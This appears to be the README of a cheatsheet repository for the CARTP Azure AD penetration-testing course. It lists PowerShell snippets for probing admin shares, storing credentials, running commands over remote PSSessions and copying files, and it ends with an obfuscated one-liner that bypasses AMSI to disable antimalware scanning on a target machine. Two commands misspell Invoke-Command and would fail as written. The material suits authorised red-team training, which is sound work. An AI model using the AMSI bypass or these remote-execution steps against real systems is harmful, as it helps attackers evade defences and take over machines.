# CARTP-cheatsheet
Azure AD cheatsheet for the CARTP course

# Sumarry
* [General](#General)
* [Recon \ OSINT](recon.md)
* [Initial access attacks](initial-access-attacks.md)
* [Authenticated enumeration](Authenticated-enumeration.md )
* [Privilege Escalation](privilege-escalation.md)
* [Cloud <-> On-Prem - Lateral Movement](Cloud-OnPrem-lateral-movement.md)
* [Persistence](persistence.md)

# General
- List of Microsoft portals https://msportals.io/
- Great resources
  - https://pentestbook.six2dez.com/enumeration/cloud/azure
  - https://github.com/Kyuu-Ji/Awesome-Azure-Pentest
  - https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md
#### Access C disk of a computer (check local admin)
```
ls \\<COMPUTERNAME>\c$
```

#### Use this parameter to not print errors powershell
```
-ErrorAction SilentlyContinue
```

#### Rename powershell windows
```
$host.ui.RawUI.WindowTitle = "<NAME>"
```

#### Save Credentials
```
$creds = get-credential

$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)
```

#### Find a specific file
```
Get-Childitem -Path C:\ -Force -Include <FILENAME OR WORD TO SEARCH> -Recurse -ErrorAction SilentlyContinue
```

## PSSession
#### Save pssession in variable
```
$sess = New-PSSession -Credential $creds -ComputerName <IP>
```

#### Run commands on machine
```
Invoke-Commannd -ScriptBlock {COMMAND} -Session $sess
```

#### Load script on machine
```
Invoke-Commannd -Filepath <PATH TO SCRIPT> -Session $sess
```

#### Copy item through PSSession
```
Copy-Item -ToSession $sess -Path <PATH> -Destination <DEST> -verbose
```

#### AMSI bypass on machine
```
Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} -Session $sess
```
